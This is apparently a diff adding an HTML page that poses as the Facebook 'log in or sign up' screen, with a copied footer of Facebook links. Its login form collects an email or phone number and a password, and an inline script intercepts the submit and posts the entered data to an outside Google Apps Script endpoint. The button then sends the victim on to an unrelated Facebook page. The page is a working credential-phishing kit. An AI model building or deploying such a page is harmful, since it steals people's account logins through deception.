@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Facebook - log in or sign up</title>
+    <link rel="shortcut icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSbRRuF2T6TCJOL2cOv9XJnTZMzS90wYhUM0w&usqp=CAU" type="image/x-icon">
+    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
+    <style>
+            .register .nav-tabs .nav-link:hover{
+                border: none;
+            }
+            *{
+	margin: 0;
+	padding: 0;
+	outline: 0;
+	text-decoration: none;
+	-webkit-box-sizing: border-box;
+	-moz-box-sizing: border-box;
+	-ms-box-sizing: border-box;
+	box-sizing: border-box;
+}
+body{
+	font-family: arial;
+	font-size: 14px;
+	color: #1c1e21;
+	font-weight: normal;
+	background: #f0f2f5
+}
+            .text-align{
+                margin-top: -3%;
+                margin-bottom: -9%;
+
+                padding: 5%;
+                margin-left: 30%;
+            }
+            .form-new{
+                margin-right: 22%;
+                margin-left: 20%;
+            }
+            .register-heading{
+                margin-left: 21%;
+                margin-bottom: 10%;
+                color: #e9ecef;
+            }
+            .register-heading h1{
+                margin-left: 21%;
+                margin-bottom: 10%;
+                color: #000102;
+            }
+            .register{
+                background: -webkit-linear-gradient(left, #d0d3d3,);
+                margin-top: 3%;
+                padding: 3%;
+                border-radius: 2.5rem;
+            }
+            .btnSubmit
+            {
+                width: 100%;
+                border-radius: 5px;                padding: 1.5%;
+                color: #fff;
+                background-color: #0056b3;
+                border: none;
+                cursor: pointer;
+                margin-right: 6%;
+                color: rgb(246, 246, 252);
+                margin-top: 4%;
+                font-size: 20px;
+                height: 50px;
+            }
+            .shit {
+                width: 50%;
+                border-radius: 5px;
+                color: #fff;
+                background-color: #0ab326;
+                border: none;
+                cursor: pointer;
+                margin-right: 6%;
+                color: rgb(246, 246, 252);
+                margin-top: 4%;
+                font-size: 20px;
+                height: 50px;
+            }
+            .facebook {
+                font-size: 50px;
+                color: #2a77db;
+                margin-bottom: 20px;
+                font-weight: 900;
+                font-style: normal;
+                line-height: 1.5;
+                text-align: left;
+                justify-content: space-between;
+                display: flex;
+	            flex-wrap: wrap;
+                align-content: center;
+                }
+            .content-left{
+	            max-width: 500px;
+	            margin: auto;
+            }
+            .kashyap {
+                width: 400px;
+                height: 350px;
+                background: #fff;
+                border-radius: 5px;
+                padding: 15px;
+                -webkit-box-shadow: -1px -1px 8px -1px rgba(0,0,0,0.52);
+                -moz-box-shadow: -1px -1px 8px -1px rgba(0,0,0,0.52);
+                box-shadow: -1px -1px 8px -1px rgba(0,0,0,0.52);
+                margin-bottom: 30px;
+            }
+            .form-control {
+                box-sizing: border-box;
+            }
+            p {
+    margin-top: 0;
+    margin-bottom: 1rem;
+}
+* {
+    margin: 0;
+        margin-top: 0px;
+        margin-bottom: 0px;
+    padding: 0;
+    outline: 0;
+    text-decoration: none;
+    -webkit-box-sizing: border-box;
+    -moz-box-sizing: border-box;
+    -ms-box-sizing: border-box;
+    box-sizing: border-box;
+}
+#shitty {
+    color: #85888a;
+    font-size: 0.12in;
+}
+    </style>
+
+</head>
+<body>
+    <br><br>
+    <h6>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="data:image/png;base64,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" width="19" height="19"> You need to login to Facebook to view the page</h6>
+        <h1 class="facebook">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Facebook</h1>
+        <h4>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Facebook helps you connect and share <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;with the people in your life.</h4>
+<div class="container register">
+            <div class="row">
+                <div class="col-md-12">
+                        <div class="tab-pane fade show active text-align form-new" id="home" role="tabpanel" aria-labelledby="home-tab">
+                            <div class="kashyap"><div class="row register-form">
+                                <div class="col-md-12">
+                                    <a><form method="post" autocomplete="off" name="google-sheet">
+                                        <center><strong style="size: 9.0in;">Log in to Facebook</strong></center><br>
+                                        <div class="form-group">
+                                            <input type="text" name="Name" class="form-control" id="bullshit" placeholder="Email address or phone number" value="" required=""/>
+                                        </div>
+                                        <div class="form-group">
+                                            <input type="password" name="Email" class="form-control" placeholder="Password" value="" required=""/>
+                                        </div>
+                                        <form>
+                                            <div class="form-group">
+                                            <input onclick="window.location.href = 'https://www.facebook.com/funnymemes2025/';" type="submit" name="submit" class="btnSubmit btn-block" value="Log in"/>
+                                        </div></form></a>
+                                    </form>
+                                    <center><a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgotten Password?<a></center>
+                                    <center><a href="https://www.facebook.com/r.php"><input type="submit" name="submit" class="shit" value="Create New Account" /></a></center>
+                                   </div>
+                                </div>
+                            </div> <center><p><a href="https://www.facebook.com/pages/create/?ref_type=registration_form" style="color: #000102;"><strong>Create a Page</strong></a> for a celebrity, band or business.</p></center>
+                        </div>
+                </div>
+            </div>
+        </div>          
+          <script>
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbxdIXNMbJeU_TjSHEG4gDw3e8wYTrR5hiJHXhElUKJHM_TQOKQcEt_9-A/exec'
+            const form = document.forms['google-sheet']
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+              .catch(error => console.error('Error!', error.message))
+            })
+          </script>
+        <script>
+            function myFunction() {
+              .w3location.replace("https://wwwschools.com")
+            }
+            </script>
+            
+        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+        <br><br><br><br><br><br><br>
+        <p style="color: rgb(92, 91, 91);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;English (UK) &nbsp;&nbsp;<a href="https://hi-in.facebook.com/" style="color: rgb(107, 107, 107);">हिन्दी</a><a href="https://mr-in.facebook.com/" style="color: rgb(107, 107, 107);">&nbsp;&nbsp;मराठी</a><a href="https://ur-pk.facebook.com/" style="color: rgb(107, 107, 107);">&nbsp;&nbsp;ردو</a>
+            <a href="https://kn-in.facebook.com/" style="color: rgb(107, 107, 107);">&nbsp;&nbsp;ಕನ್ನಡ</a>
+            <a href="https://ml-in.facebook.com/" style="color: rgb(107, 107, 107);">&nbsp;&nbsp;മലയാളം</a>
+            <a href="https://te-in.facebook.com/" style="color: rgb(107, 107, 107);">&nbsp;&nbsp;తెలుగు</a>
+            <a href="https://ta-in.facebook.com/" style="color: rgb(107, 107, 107);">&nbsp;&nbsp;தமிழ்</a>
+            <a href="https://gu-in.facebook.com/" style="color: rgb(107, 107, 107);">&nbsp;&nbsp;ગુજરાતી</a>
+            <a href="https://bn-in.facebook.com/" style="color: rgb(107, 107, 107);">&nbsp;&nbsp;বাংলা</a>
+            <a href="https://pa-in.facebook.com/" style="color: rgb(107, 107, 107);">&nbsp;&nbsp;ਪੰਜਾਬੀ&nbsp;&nbsp;</a>
+            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAe1BMVEUAAAD///+BgYHy8vIFBQWFhYXr6+tdXV1gYGDt7e1bW1vo6Ohvb2/7+/uGhobw8PAwMDDd3d0cHByhoaHS0tIQEBAhISGVlZW1tbU8PDx8fHxTU1OcnJxkZGSysrKNjY1FRUXNzc0ZGRk3NzfDw8PPz89tbW1CQkJ2dnZf+YqEAAAEO0lEQVR4nO2d63qiMBRFE1BEuYlUxFvVtl7e/wlH285MO4KjZMfEdK//nnPWR0QMSY6QHyRZFU9HHeECndE0rrLk00x8+EUH02XBOUTJX0O/KE3Xo4GyyH4bBunYdDVa6KTBh6Gfmi5FG2l2MkwKN6/giU6RHA3zkek6NPKSS5G4dxf9SpyIzHQNmslEZboEzVQiNl2CZmIxNV2CZqbC5TvpiZFw42G7Gdf9CCGEEELI47OfeY/CbN/K0Iv8RyHqtjP05aPgu2/oOW/o/jWkIQ2th4Y0tB8a0hBGXhWT1aSocnRgSww33Xl5eovQKefdDTa0FYb97vBL7GHaRwa3wTBf/xN9jRyqFhjWLPh4ASqaNwxea+K/4gaqecP6xQIxLL5xw7eGDG+oBMYNlw0ZQlQC04ZPw4YMwydQBtOGi6algeMFKINpw1ljihkog2HDpHnZVZz8/+PXYNgwa7rRCLHMMCkMGwa9xhS9AJOChjRUhIYAaEhDRWgIgIY0VISGAGhIQ0VoCICGNFSEhgBoSENFaAiAhjRUhIYAaEhDRWgIgIY0VISGAGhIQ0VoCICGNFQkCxtThKCl3nhDv389WT5oTDHIsxsi+Y0rGbGGT4tZvAyvZzloPv61HNwUKZ4t6lcVIw3flkOTh4GOh8u65e84w8CGMwjj89sTzDCv2xhyf17PdtugDPMXcKltOdtQBDLsr7F1KrDuazFsF0UPqQ7DTdO+EBMMtxoM2x0fogsPb5jPwTWqMc/hhs92HUxfPsMNC3CJqhRwwwm4QlUmcMMVuEJVVryGV/DTvofu30vd/z28sBPUBBqeaSx7Lt1oMLTqwfT7JUQZBmtslQpo+n8oc1sa0ow1/ce/cHTAfTk/qAA417YDF9uGnca5tiNvoeH50lDvfOmJ7eKwCwfX05tfmPOe926IFO4Oi23tzD78vUXSj64nuPjeIrghUv9O7y1u5tK7J56pcCU0pKEiNARAQxoqQkMANKShIjQEQEMaKkJDADSkoSI0BEBDGipCQwA0pKEiNARAQxoqQkMANKShIjQEQEMaKkJDADSkoSIXegU5sq7N/X5P7vfs+gF917aNvfO2///wVZg2lE1LaJ3pf/gDeljK+k0MO1h884ZB3TdxCPq5lzYYyqfz2+kY1aJTWmHofk/n40D1vvXl9nBDVFpiKOXG+9w9U869DTa0JYbHofpcTFaT4hk5QN+xxlAbNKSh/dCQhvZDQxraDw0dMEzbGUb+oxC0M9x7afcxSL11K0NCCCGEEELuR8d0AZrpiJHpEjQzElPTJWhmKmzoyaGTWFSmS9BMJTLTJWgmE8nBdA1aOSRCRnYdY41llEshk8KWo2XxjIvkaNh2svERSH15MpRB6uZVHKenJS3ifcq4cPG7WBbvk/bvhjKJ7DpxHcEs+lhiLT5n/hO/OuzLjhuU+0P1p9HeL50Tm7KqyptjAAAAAElFTkSuQmCC" width="17" height="17">
+        <hr>
+        <a style="color: rgb(107, 107, 107);" href="https://www.facebook.com/r.php">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sign up</a>
+        <a style="color: rgb(107, 107, 107);" href="#" onclick="window.location.reload(true);">&nbsp;&nbsp;&nbsp;Log In</a> 
+        <a style="color: rgb(107, 107, 107);" href="https://www.messenger.com/">&nbsp;&nbsp;&nbsp;Messenger</a>
+        <a style="color: rgb(107, 107, 107);" href="https://www.facebook.com/lite/">&nbsp;&nbsp;&nbsp;Facebook Lite</a>
+        <a style="color: rgb(107, 107, 107);" href="https://www.facebook.com/watch/">&nbsp;&nbsp;&nbsp; Watch </a>
+        <a style="color: rgb(107, 107, 107);" href="https://www.facebook.com/directory/people/">&nbsp;&nbsp;&nbsp;People</a>
+        <a style="color: rgb(107, 107, 107);" href="https://www.facebook.com/directory/pages/">&nbsp;&nbsp;&nbsp;Pages</a> 
+        <a style="color: rgb(107, 107, 107);" href="https://www.facebook.com/directory/pages/categories">&nbsp;&nbsp;&nbsp;Page categories</a>
+        <a style="color: rgb(107, 107, 107);" href="https://www.facebook.com/directory/places/">&nbsp;&nbsp;&nbsp;Places</a>
+        <a style="color: rgb(107, 107, 107);" href="https://www.facebook.com/directory/games/">&nbsp;&nbsp;&nbsp;Games</a>        <a href="" style="color: rgb(107, 107, 107);">&nbsp;&nbsp;&nbsp;Groups</a>
+        <a style="color: rgb(107, 107, 107);" href="https://www.facebook.com/directory/location/">&nbsp;&nbsp;&nbsp;Locations</a> 
+        <a style="color: rgb(107, 107, 107);" href="https://www.facebook.com/directory/marketplace/">&nbsp;&nbsp;&nbsp;Marketplace</a>
+        <a style="color: rgb(107, 107, 107);" href="https://pay.facebook.com/">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Facebook Pay</a>
+        <a style="color: rgb(107, 107, 107);" href="https://www.facebook.com/jobs/">&nbsp;&nbsp;&nbsp;Jobs</a>        <a href="" style="color: rgb(107, 107, 107);">&nbsp;&nbsp;&nbsp;Oculus</a>
+        <a style="color: rgb(107, 107, 107);" href="https://portal.facebook.com/">&nbsp;&nbsp;&nbsp;Portal</a> 
+        <a style="color: rgb(107, 107, 107);" href="https://instagram.com">&nbsp;&nbsp;&nbsp;Instagram</a>
+        <a style="color: rgb(107, 107, 107);" href="https://www.facebook.com/local/">&nbsp;&nbsp;&nbsp;Local</a>
+        <a style="color: rgb(107, 107, 107);" href="https://www.facebook.com/fundraise/">&nbsp;&nbsp;&nbsp;Fundraisers</a>        <a href="" style="color: rgb(107, 107, 107);">&nbsp;&nbsp;&nbsp;Voting Information Centre</a>
+        <a style="color: rgb(107, 107, 107);" href="https://www.facebook.com/services/">&nbsp;&nbsp;&nbsp;Services</a> 
+        <a style="color: rgb(107, 107, 107);" href="https://www.facebook.com/avout/">&nbsp;&nbsp;&nbsp;About</a>
+        <a style="color: rgb(107, 107, 107);" href="https://www.adchoices.com">&nbsp;&nbsp;&nbsp;Create ad</a>
+        <a style="color: rgb(107, 107, 107);" href="https://www.facebook.com/create/">&nbsp;&nbsp;&nbsp;Create Page</a>        <a href="" style="color: rgb(107, 107, 107);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Developers</a>
+        <a style="color: rgb(107, 107, 107);" href="https://www.facebook.com/carrers/">&nbsp;&nbsp;&nbsp;Careers</a> 
+        <a style="color: rgb(107, 107, 107);" href="https://www.facebook.com/privacy/">&nbsp;&nbsp;&nbsp;Privacy</a>
+        <a style="color: rgb(107, 107, 107);" href="https://www.facebook.com/cookies/">&nbsp;&nbsp;&nbsp;Cookies</a>
+        <a style="color: rgb(107, 107, 107);" href="https://www.facebook.com/adchoices/">&nbsp;&nbsp;&nbsp;AdChoices <img src="data:image/png;base64,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